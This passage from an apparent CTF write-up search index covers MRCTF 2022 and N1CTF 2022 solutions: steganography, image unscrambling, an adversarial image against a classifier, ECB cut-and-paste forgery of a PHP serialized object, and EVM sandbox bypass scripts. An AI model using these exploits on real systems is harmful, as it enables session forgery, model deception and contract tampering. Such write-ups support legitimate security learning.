\u8fdb\u53bb\uff0c\u7136\u540e\u6267\u884c\uff0c\u5f00\u5934\u4f1a\u5148 JUMP \u770b\u5230\u51fa\u9898\u4eba\u7ed9\u7684\u6570\u636e\u89e3\u6790\u53ef\u4ee5\u53d1\u73b0\u6ca1\u6709\u68c0\u67e5\u957f\u5ea6 \u6240\u4ee5\u5982\u679c\u8f93\u5165\u7684\u957f\u5ea6\u5e76\u4e0d\u662f uint16\uff0c\u90a3\u4e48\u540e\u9762\u7684\u5c31\u4f1a\u88ab\u5f53\u6210\u6b63\u5e38\u7684\u5b57\u8282\u7801\u6765\u8fd0\u884c\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5728\u4e00\u4e2a 16 \u4f4d padding \u540e\u9762\u63a5\u4e0a\u6b63\u5e38\u8fd4\u56de 1 \u7684\u5b57\u8282\u7801\u5c31\u53ef\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u76f4\u63a5\u8fd4\u56de 1 \u4f8b\u5982 0x123450600160805260206080f300 \u4e5f\u5c31\u53d8\u6210\u4e86\uff1a PUSH2 1234 POP PUSH1 0x01 PUSH1 0x80 MSTORE PUSH1 0x20 PUSH1 0x80 RETURN STOP flag: MRCTF{You_4r3_7hE_master_0f_F1nD1ng_G4g3t_0r_t73_K1ng_07_the_vuln_guesser&F0under} Bleach! \u00b6 \u8d5b\u540e\u8865\u505a\u7684\u9898 \u6d41\u91cf\u5206\u6790\u770b\u5230\u4e00\u5806 UDP \u534f\u8bae\u548c OICQ \u534f\u8bae \u5728\u8d5b\u540e\u770b\u4e86 nano \u7684 wp \u540e\u77e5\u9053\u90a3\u4e00\u5927\u5806 UDP \u662f\u5728 UDP \u57fa\u7840\u4e0a\u7684 RTP \u534f\u8bae\uff0c\u8981\u5728 wireshark \u91cc decode as RTP \u624d\u80fd\u663e\u793a\u4e3a RTP \u6d41 \u7136\u540e\u901a\u8fc7 wireshark \u7684 RTP \u6d41\u64ad\u653e\u5668\u5bfc\u51fa\u97f3\u9891 raw \u6587\u4ef6\uff0c\u5728 Au \u4e2d\u6253\u5f00\uff0c\u6839\u636e\u9898\u76ee\u63cf\u8ff0\u7684\u63d0\u793a\uff0c\u5e94\u8be5\u662f 44100Hz\u300116 \u4f4d PCM \u7f16\u7801\uff0c\u6253\u5f00\u540e\u53ef\u4ee5\u542c\u5230\u6e05\u6670\u6b4c\u66f2\u58f0\u97f3 \u518d\u7531\u9898\u76ee\u63cf\u8ff0\u4e2d\u7684 picture in music \u60f3\u5230 lsb\uff0c\u4ee5\u53ca 400*400 \u7684\u56fe\u7247\u5927\u5c0f\u3002\u6240\u4ee5\u5b58\u4e3a wav \u540e\u8bfb\u53d6\uff0c\u63d0\u53d6 lsb \u8f6c\u4e3a\u56fe\u7247 \u56e0\u4e3a\u5b58\u4e0b\u6765\u7684 wav \u662f 16 \u4f4d\u6574\u6570\uff0c\u6240\u4ee5\u6bcf\u4e00\u5e27\u89c6\u4e3a\u4e24\u4e2a 8 \u4f4d\u6574\u6570\uff0c\u5206\u522b\u63d0\u53d6 lsb\uff0c\u4e00\u5171\u9700\u8981 400*400/2 \u5e27\uff1a exp import wave from PIL import Image f = wave . open ( \"bleach.wav\" , \"rb\" ) frames = f . readframes ( 400 * 400 // 2 ) res = [ 255 if frame & 1 else 0 for frame in frames ] img = Image . new ( \"L\" , ( 400 , 400 )) k = 0 for i in range ( 400 ): for j in range ( 400 ): img . putpixel (( j , i ), res [ k ]) k += 1 img . show () img . save ( \"flag.png\" ) flag: MRCTF{Don\u2019t_Use_Your_tools!}","title":"MRCTF 2022"},{"location":"writeups/mrctf2022/#mrctf-2022-writeup","text":"Abstract \u53d7\u9ad8\u4e2d\u5b66\u957f\u9080\u8bf7\u6765\u6253\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u8d28\u91cf\u5f88\u9ad8\uff0c\u6253\u7684\u5f88\u723d\uff0c\u961f\u91cc\u5927\u624b\u5b50\u5f3a\u7684\u5f88\uff0c\u5e26\u7740\u62ff\u4e86\u7b2c\u4e00 misc \u6709\u4e00\u9053\u9898\u6ca1\u505a\u51fa\u6765\uff0c\u770b\u4e86 nano \u7684 wp \u540e\u8865\u51fa\u6765\u4e86\uff0c\u8fd9\u6b21\u6bd4\u8d5b\u4e5f\u53c2\u4e0e\u4e86\u4e00\u4e0b eth \u9898\u76ee","title":"MRCTF 2022 Writeup"},{"location":"writeups/mrctf2022/#readlongnovel","text":"\u7531\u4e8e\u65f6\u95f4\u591f\u957f\u3001\u9898\u5e93\u4e0d\u5927\uff0c\u6240\u4ee5\u76f4\u63a5\u7f51\u7edc\u641c\u7d22 + \u539f\u6587 txt \u641c\u7d22\u5c31\u53ef\u4ee5\u624b\u52a8\u641e\u5dee\u4e0d\u591a flag: MRCTF{\u613f\u60a8\u7684+\u6587\u660e+\u6c38\u8fdc\u8fdb\u6b65}","title":"ReadLongNovel"},{"location":"writeups/mrctf2022/#connecting","text":"obj \u6709\u4e2a\u6570\u636e\u4e0d\u6539\u7684\u8bdd blender \u52a0\u8f7d\u4e0d\u51fa\u6765\uff084d33 \u4e0d\u662f\u5341\u8fdb\u5236\u6570\uff09 \u7136\u540e\u53d1\u73b0\u6240\u6709 f \u90fd\u662f / \u5206\u9694\u7684\u4e09\u4e2a\u6570\u76f8\u540c\uff0c\u53ea\u6709\u8fd9\u4e00\u884c\u4e0d\u76f8\u540c >>> for each in [ 0x4d , 0x33 , 0x52 , 0x37 , 0x61 , 0x49 , 0x63 , 0x54 , 0x46 ]: ... print ( chr ( each ), end = \"\" ) ... M3R7aIcTF \u56fe\u7247\u5f00\u5934 xml \u4fe1\u606f\u4e2d\u53d1\u73b0\uff1aThank Fabien Petitcolas For his work. \u641c\u5230 mp3stego\uff0c\u7528\u5b83\u548c\u5bc6\u7801 M3R7aIcTF \u6765\u89e3\u5bc6 wav \u6587\u4ef6\uff08\u5176\u5b9e\u662f mp3\uff09\u5f97\u5230\uff1a FBGTGURXMFEWGVCGFEWSAKZAFVGVEQ2UIZ5VOSKGJFPTEMBSGJPWG33ONZSWG5C7ON2WGY3FONZWM5LMNR4SC7I base32\uff1a (M3R7aIcTF)- + -MRCTF{WIFI_2022_connect_successfully!} flag: MRCTF{WIFI_2022_connect_successfully!}","title":"Connecting..."},{"location":"writeups/mrctf2022/#pixel","text":"blue plane \u770b\u8d77\u6765\u5f88\u6709\u95ee\u9898\uff0c\u628a 512 \u5f20\u56fe\u7247\u7684\u6240\u6709\u70b9\u70b9\u53e0\u52a0\uff08blue \u5404\u4e2a plane \u90fd\u5dee\u4e0d\u591a\uff0c\u8fd9\u4e2a\u662f blue 3\uff09 \u518d\u6839\u636e hint \u76f4\u63a5\u641e\u5230\u539f\u56fe\uff1a img2 = Image . new ( \"RGB\" , ( 512 , 512 )) for i in range ( 512 ): for j in range ( 512 ): img2 . putpixel (( i , j ), ( 255 , 255 , 255 )) for n in tqdm ( range ( 512 )): img = Image . open ( f \"pixel/ { n } .png\" ) width , height = img . size for i in range ( width ): for j in range ( height ): R , G , B = pix = img . getpixel (( i , j )) if B != 255 : img2 . putpixel (( i , j ), pix ) img2 . save ( f \"zigzag.png\" ) red plane 0 \u6709\u95ee\u9898 \u6839\u636e zigzag \u63a8\u6d4b\u9700\u8981\u8fdb\u884c\u4e00\u4e9b zigzag \u64cd\u4f5c\uff08\u5373\u50cf\u7d20\u70b9\u987a\u5e8f\u7684\u8f6c\u6362\uff09\u7f51\u4e0a\u627e\u627e\u4ee3\u7801\u6539\u4e00\u6539 zigzag from PIL import Image import numpy as np def zigzag ( data ): row = data . shape [ 0 ] col = data . shape [ 1 ] num = row * col lst = np . zeros ( num ,) k = 0 i = 0 j = 0 while i < row and j < col and k < num : lst [ k ] = data . item ( i , j ) k = k + 1 if ( i + j ) % 2 == 0 : if ( i - 1 ) in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) in range ( col ): j = j + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 else : i = i - 1 j = j + 1 elif ( i + j ) % 2 == 1 : if ( i + 1 ) in range ( row ) and ( j - 1 ) not in range ( col ): i = i + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) in range ( col ): j = j + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) not in range ( col ): j = j + 1 else : i = i + 1 j = j - 1 return lst def dezigzag ( data ): num = len ( data ) row = int ( num ** 0.5 ) col = int ( num ** 0.5 ) lst = np . zeros (( row , col )) k = 0 i = 0 j = 0 while i < row and j < col and k < num : lst [ i ][ j ] = data [ k ] k = k + 1 if ( i + j ) % 2 == 0 : if ( i - 1 ) in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) in range ( col ): j = j + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 else : i = i - 1 j = j + 1 elif ( i + j ) % 2 == 1 : if ( i + 1 ) in range ( row ) and ( j - 1 ) not in range ( col ): i = i + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) in range ( col ): j = j + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) not in range ( col ): j = j + 1 else : i = i + 1 j = j - 1 return lst def ZigZag ( data ): lst = zigzag ( data ) k = 0 ret = np . zeros ( data . shape ) row , col = data . shape for i in range ( row ): for j in range ( col ): ret [ i ][ j ] = lst [ k ] k += 1 return ret def deZigZag ( data ): lst = [] row , col = data . shape for i in range ( row ): for j in range ( col ): lst . append ( data [ i ][ j ]) ret = dezigzag ( lst ) return ret img = Image . open ( \"XXX\" ) . convert ( \"L\" ) arr = np . array ( img ) #for i in range(64): #for j in range(64): # arr[8*i:8*i+8, 8*j:8*j+8] = ZigZag(arr[8*i:8*i+8, 8*j:8*j+8]) #arr[8*i:8*i+8, 8*j:8*j+8] = deZigZag(arr[8*i:8*i+8, 8*j:8*j+8]) arr [ 0 : 512 , 0 : 512 ] = deZigZag ( arr [ 0 : 512 , 0 : 512 ]) img2 = Image . fromarray ( arr , \"L\" ) img2 . show () img2 . save ( \"XXX\" ) \u660e\u663e\u662f\u732b\u56fe\u7b97\u6cd5\uff0c\u53c2\u6570 20 22 cat map import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , keep_all = False , name = XXX ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 441 * x + 20 * y ) % width ny = ( 22 * x + 1 * y ) % height canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) if counter > 0 and not keep_all : os . remove ( path ) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( XXX , 512 , True ) result . show () flag: MRCTF{f8e49887132bf8977a161472781b718c}","title":"Pixel"},{"location":"writeups/mrctf2022/#spy_dog","text":"\u8981\u6c4299.9%\u7684\u6982\u7387\u8bc6\u522b\u6210\u732b\u3002 \u7528\u68af\u5ea6\u53cd\u5411\u4f20\u64ad\u8bad\u7ec3\u7f51\u7edc\u53c2\u6570\u7684\u65b9\u5f0f\u8bad\u7ec3\u56fe\u7247\u5373\u53ef\uff0c\u4ee3\u7801\u76f4\u63a5\u6284\u7f51\u4e0a\u7684\uff1a https://www.likecs.com/show-915984.html \u7531\u4e8e\u53d6\u6574\u5e26\u6765\u7684\u95ee\u9898\uff0c\u8bad\u7ec3\u5f97\u5230\u7684\u51c6\u786e\u7387\u8981\u6bd4\u8981\u6c42\u9ad8\u4e00\u70b9 exp # %% from keras.models import load_model import cv2 import numpy as np from keras.preprocessing import image from keras.applications import inception_v3 from keras import backend as K from PIL import Image import tensorflow as tf tf . compat . v1 . disable_eager_execution () # %% model = load_model ( \"simplenn.model\" ) # %% # Grab a reference to the first and last layer of the neural net model_input_layer = model . layers [ 0 ] . input model_output_layer = model . layers [ - 1 ] . output object_type_to_fake = 1 # Load the image to hack img = cv2 . imread ( \"dog.bmp\" ) original_image = img . astype ( np . float32 ) # Scale the image so all pixel intensities are between [-1, 1] as the model expects original_image /= 255. # Add a 4th dimension for batch size (as Keras expects) original_image = np . expand_dims ( original_image , axis = 0 ) # Pre-calculate the maximum change we will allow to the image # We\\'ll make sure our hacked image never goes past this so it doesn\\'t look funny. # A larger number produces an image faster but risks more distortion. max_change_above = original_image + ( 9.4 / 255. ) max_change_below = original_image - ( 9.4 / 255. ) # Create a copy of the input image to hack on hacked_image = np . copy ( original_image ) # How much to update the hacked image in each iteration learning_rate = 0.1 # Define the cost function. # Our \\'cost\\' will be the likelihood out image is the target class according to the pre-trained model cost_function = model_output_layer [ 0 , object_type_to_fake ] # We\\'ll ask Keras to calculate the gradient based on the input image and the currently predicted class # In this case, referring to \"model_input_layer\" will give us back image we are hacking. gradient_function = K . gradients ( cost_function , model_input_layer )[ 0 ] # Create a Keras function that we can call to calculate the current cost and gradient grab_cost_and_gradients_from_model = K . function ([ model_input_layer , K . learning_phase ()], [ cost_function , gradient_function ]) cost = 0.0 # In a loop, keep adjusting the hacked image slightly so that it tricks the model more and more # until it gets to at least 80% confidence while cost < 0.9995 : # Check how close the image is to our target class and grab the gradients we # can use to push it one more step in that direction. # Note: It\\'s really important to pass in \\'0\\' for the Keras learning mode here! # Keras layers behave differently in prediction vs. train modes! cost , gradients = grab_cost_and_gradients_from_model ([ hacked_image , 0 ]) # Move the hacked image one step further towards fooling the model hacked_image += gradients * learning_rate # Ensure that the image doesn\\'t ever change too much to either look funny or to become an invalid image hacked_image = np . clip ( hacked_image , max_change_below , max_change_above ) hacked_image = np . clip ( hacked_image , - 1.0 , 1.0 ) print ( \"Model \\' s predicted likelihood that the image is a cat: {:.8} %\" . format ( cost * 100 )) # De-scale the image\\'s pixels from [-1, 1] back to the [0, 255] range img = hacked_image [ 0 ] . copy () img *= 255. # Save the hacked image! cv2 . imwrite ( 'hacked.bmp' , img . astype ( np . uint8 )) # %% check model = load_model ( \"simplenn.model\" ) def checkMask ( model , img ): predict = model . predict ( img ) return predict [ 0 ][ 1 ] def checkSkin ( img1 , img2 ): output = [] for i in range ( 0 , len ( img1 )): for j in range ( 0 , len ( img1 [ i ])): output . append ( img2 [ i ][ j ] - img1 [ i ][ j ]) maxnum = 0 for i in output : num = 0 for j in i : if j >= 200 : j = 255 - j num = j if num >= maxnum : maxnum = num index = i print ( index ) print ( maxnum ) if maxnum > 10 : return 0 else : return 1 score = 0 img = cv2 . imread ( 'hacked.bmp' ) score += checkSkin ( img , cv2 . imread ( \"dog.bmp\" )) img = cv2 . resize ( img , ( 128 , 128 )) img_tensor = np . expand_dims ( img , axis = 0 ) img_tensor = img_tensor . astype ( np . float32 ) img_tensor /= 255. score += checkMask ( model , img_tensor ) print ( score ) flag: MRCTF{A_D0g_W1th_Br1lli4nt_Tric7}","title":"Spy_Dog"},{"location":"writeups/mrctf2022/#pdd","text":"\u65e0\u6cd5\u4f2a\u9020 ip \u8fdb\u884c\u52a9\u529b\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u8d8b\u8fd1 100 \u800c\u4e0d\u4f1a\u7b49\u4e8e \u6ce8\u610f\u5230\u9664\u88ab\u52a9\u529b\u6b21\u6570\u4ee5\u5916\u7684\u6570\u636e\u90fd\u662f\u5b58\u5728\u5ba2\u6237\u7aef\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e0a\u7684\uff0c\u5c1d\u8bd5\u63a7\u5236 name \u751f\u6210\u51fa\u76ee\u6807 enc \u5373\u53ef\uff08\u53ef\u5728 debug \u4e0a\u770b\u5230\u89e3\u5bc6\u7ed3\u679c\uff09 \u7b80\u5355\u5c1d\u8bd5\u53ef\u77e5\u52a0\u5bc6\u662f\u5e26 pad \u7684\u6bcf 16 \u5b57\u8282\u8fdb\u884c ECB \u52a0\u5bc6\u7684\u672a\u77e5\u52a0\u5bc6\u3002\uff08\u7c7b\u4f3c AES-256-ECB\uff09 let enc1 = await fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=start\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ username : 'user_tpHRGt11111111111111' }), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => x . enc ); let enc2 = await fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=start\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ username : '111111111111' + 'O:4:\"User\":3:{s:8:\"username\";s:22:\"user_tpHRGt11111111111\";s:5:\"times\";i:110;s:5:\"money\";d:100;}' }), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => x . enc ); fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=getFlag\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ enc : btoa ( atob ( enc2 ). slice ( 48 ). slice ( 0 , target . length ) + atob ( enc1 ). slice ( - 16 ))}), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => { console . log ( x . flag ); }) flag: MRCTF{Xi_Xi0ngDi_9_Na_Kan_w0!}","title":"pdd"},{"location":"writeups/mrctf2022/#sandsandsand","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.7.0 ; contract checktheCode { function checks ( address a ) public { uint256 size ; assembly { size : = extcodesize ( a ) } require ( size < 0x10 ); } } contract BabySandbox { event SendFlag ( address ); checktheCode public A ; constructor () public { A = new checktheCode (); } function run ( address code ) external payable { bool success ; bytes memory result ; ( success , result ) = address ( A ). call ( abi . encodeWithSignature ( \"checks(address)\" , code ) ); require ( success == true ); assembly { if eq ( caller (), address ()) { switch delegatecall ( gas (), code , 0x00 , 0x00 , 0x00 , 0x00 ) case 0 { returndatacopy ( 0x00 , 0x00 , returndatasize ()) revert ( 0x00 , returndatasize ()) } case 1 { returndatacopy ( 0x00 , 0x00 , returndatasize ()) return ( 0x00 , returndatasize ()) } } if lt ( gas (), 0xB000 ) { revert ( 0x00 , 0x00 ) } calldatacopy ( 0x00 , 0x00 , calldatasize ()) if eq ( staticcall ( 0x5000 , address (), 0 , calldatasize (), 0 , 0 ), 1 ) { revert ( 0x00 , 0x00 ) } if eq ( call ( 0x5000 , address (), 0 , 0 , calldatasize (), 0 , 0 ), 0 ) { revert ( 0x00 , 0x00 ) } } emit SendFlag ( msg.sender ); } } \u7b80\u5355\u5206\u6790\u4e00\u4e0b\u5c31\u662f\u8981\u7528 0x5000 \u7684 gas \u8c03\u7528\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5408\u7ea6\uff0c\u8981\u6c42 staticcall \u8c03\u7528\u4f1a\u5931\u8d25\uff0ccall \u4f1a\u6210\u529f\uff0c\u5e76\u4e14\u5408\u7ea6\u5b57\u8282\u7801\u5728 0x10 \u4ee5\u5185 \u76f4\u63a5\u5728\u5408\u7ea6\u4e2d\u6267\u884c\u4e00\u6b21 sstore \u5c31\u53ef\u4ee5\u8ba9 staticcall \u6302\u6389\uff0cyul \u5408\u7ea6\uff1a object \"DeleCaller\" { code { sstore ( 0 , 0 ) datacopy ( 0 , dataoffset ( \"Runtime\" ), datasize ( \"Runtime\" )) return ( 0 , datasize ( \"Runtime\" )) } object \"Runtime\" { code { sstore ( 0 , 0 ) stop () } } } \u6216\u8005\u624b\u5199\u6c47\u7f16\uff1a ; \u524d\u9762\u5957\u4e00\u5c42 creationCode PUSH1 0x00 ; 6000 PUSH1 0x00 ; 6000 SSTORE ; 55 STOP ; 00 exp from web3 import Web3 w3 = Web3 ( Web3 . HTTPProvider ( 'http://retr0.vip:8545' )) hacker = '...' target = '...' privateKey = '...' def get_txn ( src , dst , data , value = 0 , gas = 0x200000 ): return { \"chainId\" : 0x4bb , \"from\" : src , \"to\" : dst , \"gasPrice\" : w3 . toWei ( 1.1 , 'gwei' ), \"gas\" : gas , \"value\" : w3 . toWei ( value , 'ether' ), \"nonce\" : w3 . eth . getTransactionCount ( src ), \"data\" : data } data = get_txn ( hacker , None , bytes . fromhex ( \"60006000556006601160003960066000f3600060005500\" )) transaction = w3 . eth . account . signTransaction ( data , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) print ( txn_receipt ) contractAddress = txn_receipt [ 'contractAddress' ] data = get_txn ( hacker , target , bytes . fromhex ( \"522bb704000000000000000000000000\" + contractAddress [ 2 :])) transaction = w3 . eth . account . signTransaction ( data , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) print ( txn_receipt ) flag: MRCTF{TheShor7testShel1c0dE&EIP-2929}","title":"SandSandSand"},{"location":"writeups/mrctf2022/#jop_gadget","text":"\u9898\u76ee\u7684\u610f\u601d\u5c31\u662f\u4f1a\u5148\u628a\u8f93\u5165 PUSH2 \u8fdb\u53bb\uff0c\u7136\u540e\u6267\u884c\uff0c\u5f00\u5934\u4f1a\u5148 JUMP \u770b\u5230\u51fa\u9898\u4eba\u7ed9\u7684\u6570\u636e\u89e3\u6790\u53ef\u4ee5\u53d1\u73b0\u6ca1\u6709\u68c0\u67e5\u957f\u5ea6 \u6240\u4ee5\u5982\u679c\u8f93\u5165\u7684\u957f\u5ea6\u5e76\u4e0d\u662f uint16\uff0c\u90a3\u4e48\u540e\u9762\u7684\u5c31\u4f1a\u88ab\u5f53\u6210\u6b63\u5e38\u7684\u5b57\u8282\u7801\u6765\u8fd0\u884c\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5728\u4e00\u4e2a 16 \u4f4d padding \u540e\u9762\u63a5\u4e0a\u6b63\u5e38\u8fd4\u56de 1 \u7684\u5b57\u8282\u7801\u5c31\u53ef\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u76f4\u63a5\u8fd4\u56de 1 \u4f8b\u5982 0x123450600160805260206080f300 \u4e5f\u5c31\u53d8\u6210\u4e86\uff1a PUSH2 1234 POP PUSH1 0x01 PUSH1 0x80 MSTORE PUSH1 0x20 PUSH1 0x80 RETURN STOP flag: MRCTF{You_4r3_7hE_master_0f_F1nD1ng_G4g3t_0r_t73_K1ng_07_the_vuln_guesser&F0under}","title":"JOP_Gadget"},{"location":"writeups/mrctf2022/#bleach","text":"\u8d5b\u540e\u8865\u505a\u7684\u9898 \u6d41\u91cf\u5206\u6790\u770b\u5230\u4e00\u5806 UDP \u534f\u8bae\u548c OICQ \u534f\u8bae \u5728\u8d5b\u540e\u770b\u4e86 nano \u7684 wp \u540e\u77e5\u9053\u90a3\u4e00\u5927\u5806 UDP \u662f\u5728 UDP \u57fa\u7840\u4e0a\u7684 RTP \u534f\u8bae\uff0c\u8981\u5728 wireshark \u91cc decode as RTP \u624d\u80fd\u663e\u793a\u4e3a RTP \u6d41 \u7136\u540e\u901a\u8fc7 wireshark \u7684 RTP \u6d41\u64ad\u653e\u5668\u5bfc\u51fa\u97f3\u9891 raw \u6587\u4ef6\uff0c\u5728 Au \u4e2d\u6253\u5f00\uff0c\u6839\u636e\u9898\u76ee\u63cf\u8ff0\u7684\u63d0\u793a\uff0c\u5e94\u8be5\u662f 44100Hz\u300116 \u4f4d PCM \u7f16\u7801\uff0c\u6253\u5f00\u540e\u53ef\u4ee5\u542c\u5230\u6e05\u6670\u6b4c\u66f2\u58f0\u97f3 \u518d\u7531\u9898\u76ee\u63cf\u8ff0\u4e2d\u7684 picture in music \u60f3\u5230 lsb\uff0c\u4ee5\u53ca 400*400 \u7684\u56fe\u7247\u5927\u5c0f\u3002\u6240\u4ee5\u5b58\u4e3a wav \u540e\u8bfb\u53d6\uff0c\u63d0\u53d6 lsb \u8f6c\u4e3a\u56fe\u7247 \u56e0\u4e3a\u5b58\u4e0b\u6765\u7684 wav \u662f 16 \u4f4d\u6574\u6570\uff0c\u6240\u4ee5\u6bcf\u4e00\u5e27\u89c6\u4e3a\u4e24\u4e2a 8 \u4f4d\u6574\u6570\uff0c\u5206\u522b\u63d0\u53d6 lsb\uff0c\u4e00\u5171\u9700\u8981 400*400/2 \u5e27\uff1a exp import wave from PIL import Image f = wave . open ( \"bleach.wav\" , \"rb\" ) frames = f . readframes ( 400 * 400 // 2 ) res = [ 255 if frame & 1 else 0 for frame in frames ] img = Image . new ( \"L\" , ( 400 , 400 )) k = 0 for i in range ( 400 ): for j in range ( 400 ): img . putpixel (( j , i ), res [ k ]) k += 1 img . show () img . save ( \"flag.png\" ) flag: MRCTF{Don\u2019t_Use_Your_tools!}","title":"Bleach!"},{"location":"writeups/n1ctf2022/","text":"N1CTF 2022 Writeup \u00b6 Abstract \u8fd9\u6b21\u4e3b\u8981\u505a\u4e86\u4e0b blockchain\uff0cmisc \u6709\u4e2a\u5185\u5b58\u53d6\u8bc1\u5dee\u4e00\u70b9\u505a\u51fa\u6765\uff0c\u4e5f\u5728\u8fd9\u91cc\u8bb0\u4e00\u4e0b \u542c\u8bf4\u8fd9\u6b21\u7684 blockchain \u4f1a\u8bbe\u5355\u9879\u5956\uff0c\u5e94\u8be5\u5f88\u6709\u8d28\u91cf\u3002\u6ca1\u60f3\u5230\u662f\u6ca1\u63a5\u89e6\u8fc7\u7684 solana \u533a\u5757\u94fe\uff0c\u7b2c\u4e00\u6b21\u73a9\uff0c\u8fd8\u633a\u6709\u610f\u601d\u7684\uff0c\u800c\u4e14\u9898\u7ed9\u7684\u505a\u9898\u6846\u67b6\u4e5f\u5f88\u5168\uff0c\u8fd8\u7b97\u5f88\u8212\u9002 \u611f\u89c9 solana \u8fd8\u662f\u6709\u5f88\u591a\u9700\u8981\u4e86\u89e3\u7684\u57fa\u7840\u77e5\u8bc6\u8fd8\u662f\u5f88\u591a\u7684\uff0c\u6709\u65f6\u95f4\u4ee5\u540e\u7cfb\u7edf\u5b66\u4e60\u7684\u65f6\u5019\u518d\u8bb0\u5f55\u5427 Utility Payment Service \u00b6 solana \u7684\u5408\u7ea6\u770b\u8d77\u6765\u5f88\u957f\u5f88\u590d\u6742\uff0c\u9644\u4ef6\u4e5f\u662f\u5b8c\u6574\u7684 cargo \u5de5\u4f5c\u533a\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u5168\u5217\u51fa\u6765\u4e86\u3002 processor \u90e8\u5206 use borsh :: { BorshDeserialize , BorshSerialize }; use solana_program :: { account_info :: { next_account_info , AccountInfo }, entrypoint :: ProgramResult , msg , program :: { invoke , invoke_signed }, pubkey :: Pubkey , system_instruction , }; use crate :: { Escrow , ServiceInstruction , ESCROW_ACCOUNT_SIZE }; pub fn process_instruction ( program : & Pubkey , accounts : & [ AccountInfo ], mut data : & [ u8 ], ) -> ProgramResult { match ServiceInstruction :: deserialize ( & mut data ) ? { ServiceInstruction :: Init {} => init_escrow ( program , accounts ), ServiceInstruction :: DepositEscrow { amount } => deposit_escrow ( program , accounts , amount ), ServiceInstruction :: WithdrawEscrow {} => withdraw_escrow ( program , accounts ), ServiceInstruction :: Pay { amount } => pay_utility_fees ( program , accounts , amount ), } } pub fn get_escrow ( program : Pubkey , user : Pubkey ) -> ( Pubkey , u8 ) { Pubkey :: find_program_address ( & [ \"ESCROW\" . as_bytes (), & user . to_bytes ()], & program ) } pub fn get_reserve ( program : Pubkey ) -> ( Pubkey , u8 ) { Pubkey :: find_program_address ( & [ \"RESERVE\" . as_bytes ()], & program ) } /// /// init escrow /// fn init_escrow ( program : & Pubkey , accounts : & [ AccountInfo ]) -> ProgramResult { let account_iter = & mut accounts . iter (); let user = next_account_info ( account_iter ) ? ; let _reserve = next_account_info ( account_iter ) ? ; let escrow_account = next_account_info ( account_iter ) ? ; let sys_prog = next_account_info ( account_iter ) ? ; assert! ( user . is_signer ); assert! ( escrow_account . data_is_empty ()); let ( expected_escrow , escrow_bump ) = get_escrow ( * program , * user . key ); invoke_signed ( & system_instruction :: create_account ( & user . key , & expected_escrow , 1 , ESCROW_ACCOUNT_SIZE as u64 , & program , ), & [ user . clone (), escrow_account . clone (), sys_prog . clone ()], & [ & [ \"ESCROW\" . as_bytes (), & user . key . to_bytes (), & [ escrow_bump ]]], ) ? ; let escrow_data = Escrow { user : * user . key , amount : 0 , bump : escrow_bump , }; escrow_data . serialize ( & mut & mut ( * escrow_account . data ). borrow_mut ()[ .. ]). unwrap (); Ok (()) } /// /// deposit escrow /// fn deposit_escrow ( program : & Pubkey , accounts : & [ AccountInfo ], deposit_amount : u16 , ) -> ProgramResult { let account_iter = & mut accounts . iter (); let user = next_account_info ( account_iter ) ? ; let reserve = next_account_info ( account_iter ) ? ; let escrow_account = next_account_info ( account_iter ) ? ; let sys_prog = next_account_info ( account_iter ) ? ; assert! ( user . is_signer ); let ( expected_reserve , _reserve_bump ) = get_reserve ( * program ); assert_eq! ( expected_reserve , * reserve . key ); let ( expected_escrow , _escrow_bump ) = get_escrow ( * program , * user . key ); assert_eq! ( expected_escrow , * escrow_account . key ); invoke ( & system_instruction :: transfer ( & user . key , & reserve . key , deposit_amount as u64 ), & [ user . clone (), reserve . clone (), sys_prog . clone () ], ) ? ; let escrow_data = & mut Escrow :: deserialize ( & mut & ( * escrow_account . data ). borrow_mut ()[ .. ]) ? ; escrow_data . amount += deposit_amount ; escrow_data . serialize ( & mut & mut ( * escrow_account . data ). borrow_mut ()[ .. ]) . unwrap (); Ok (()) } /// /// withdraw all balance in escrow /// fn withdraw_escrow ( program : & Pubkey , accounts : & [ AccountInfo ]) -> ProgramResult { let account_iter = & mut accounts . iter (); let user = next_account_info ( account_iter ) ? ; let reserve = next_account_info ( 